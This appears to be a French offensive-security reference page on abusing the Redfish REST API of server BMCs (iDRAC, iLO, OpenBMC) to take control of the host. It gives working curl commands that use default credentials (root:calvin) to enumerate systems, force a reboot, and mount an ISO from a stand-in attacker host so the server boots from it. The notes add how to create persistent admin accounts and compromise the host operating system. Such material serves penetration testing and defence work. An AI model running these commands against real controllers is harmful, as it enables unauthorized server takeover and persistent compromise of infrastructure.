---
title: "API Redfish : détourner l'API REST moderne des BMC"
order: 5
description: "Redfish est l'API REST standardisée que les BMC modernes exposent pour la gestion. Atteinte avec des identifiants par défaut ou récupérés (ou une faille d'authentification), elle lit l'inventaire matériel et contrôle l'hôte : état d'alimentation, périphérique de démarrage, comptes BMC et média virtuel. C'est la voie propre et scriptable vers le même contrôle compromettant l'hôte que l'IPMI historique."
keywords:
  - redfish
  - api rest
  - bmc
  - média virtuel
  - contrôle de l'alimentation
---

# API Redfish

Redfish est l'API REST/JSON standardisée par le DMTF que les BMC modernes (iDRAC, iLO, Supermicro, OpenBMC) exposent sur HTTPS, destinée à remplacer l'interface IPMI historique. Pour un attaquant, c'est le plan de contrôle propre et scriptable : authentifié avec des identifiants par défaut ou récupérés (ou atteint via une faille d'authentification), il lit l'inventaire matériel complet et effectue les opérations compromettant l'hôte, interrogeant et modifiant l'état d'alimentation, définissant le périphérique de démarrage unique, créant et modifiant les comptes BMC, et attachant du média virtuel. Il délivre le même impact que les attaques IPMI à travers une API bien documentée, ce qui le rend pratique pour l'énumération et l'automatisation sur de nombreux contrôleurs.

```bash
# unauthenticated service root reveals structure/version
curl -sk https://<bmc>/redfish/v1/
# authenticate (default/recovered creds) and enumerate
curl -sk -u root:calvin https://<bmc>/redfish/v1/Systems/
# control the host: power and one-time boot
curl -sk -u root:calvin -X POST https://<bmc>/redfish/v1/Systems/System.Embedded.1/Actions/ComputerSystem.Reset \
  -H 'Content-Type: application/json' -d '{"ResetType":"ForceRestart"}'
# attach virtual media (mount an attacker ISO) and boot from it
curl -sk -u root:calvin -X POST https://<bmc>/redfish/v1/Managers/.../VirtualMedia/CD/Actions/VirtualMedia.InsertMedia \
  -d '{"Image":"http://attacker/evil.iso"}'
# create a persistent admin BMC account via the Accounts collection
```

## Notes d'exploitation

- Redfish est l'équivalent scriptable des attaques IPMI/constructeur : avec des identifiants, il lit l'inventaire et pilote l'alimentation, le démarrage, les comptes et le média virtuel sur les contrôleurs de façon uniforme, idéal pour l'automatisation à l'échelle d'un parc.
- L'action à plus fort impact est la même qu'ailleurs, attacher du média virtuel malveillant et définir un démarrage unique pour compromettre le système d'exploitation de l'hôte ; le contrôle de l'alimentation et du démarrage et la création de comptes servent cela et la persistance.
- Les identifiants proviennent des [défauts](bmc-default-credentials.md), des [hachages RAKP cassés](ipmi-rakp-hash-disclosure.md) ou d'un [exploit](idrac-and-ilo.md) de contrôleur ; certaines implémentations de Redfish ont aussi connu leurs propres failles de contournement d'authentification, alors testez la racine du service et la version.
- La racine non authentifiée `/redfish/v1/` divulgue la structure et la version du micrologiciel pour le relevé d'empreinte même avant les identifiants.

## Références

- [DMTF Redfish specification](https://www.dmtf.org/standards/redfish)
- [HackTricks: Redfish/BMC](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi)
